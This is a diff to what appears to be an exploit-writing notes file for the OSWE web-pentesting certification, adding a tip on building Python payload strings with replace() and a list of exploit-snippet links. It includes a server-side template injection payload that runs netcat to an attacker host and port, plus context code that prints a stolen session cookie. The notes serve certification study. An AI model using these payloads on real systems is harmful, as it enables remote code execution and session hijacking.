@@ -220,3 +220,21 @@ def doGET(self):
     session.cookies["PHPSESSID"] = cookies.SimpleCookie(plain_cookie)["PHPSESSID"]
     print("[+] Stolen cookie:", session.cookies["PHPSESSID"])
 ```
+## Using `.replace()`
+Too many curly braces (`{}`) will make you in trouble sometimes.
+```python
+ssti_payload = f"{{{{ __import__('os').system('nc {LHOST} {LPORT}') }}}}"
+```
+Use `replace()` instead,
+```python
+ssti_payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}"\
+    .replace("<LHOST>", LHOST)\
+    .replace("<LPORT>", LPORT)
+```
+
+## Other interesting links, blogs and snippets
+- <https://0x4rt3mis.github.io/posts/Python-Code-Snippets/>
+- <https://notes.awfulsecurity.org/oswe/oswe-code-review-cheat-sheet>
+- <https://github.com/rizemon/exploit-writing-for-oswe/tree/main>
+- <https://field-manual.brunorochamoura.com/manual/toolkit/snippets/>
+- <https://github.com/computer-engineer/WhiteboxPentest/tree/main/Skeleton%20Scripts>
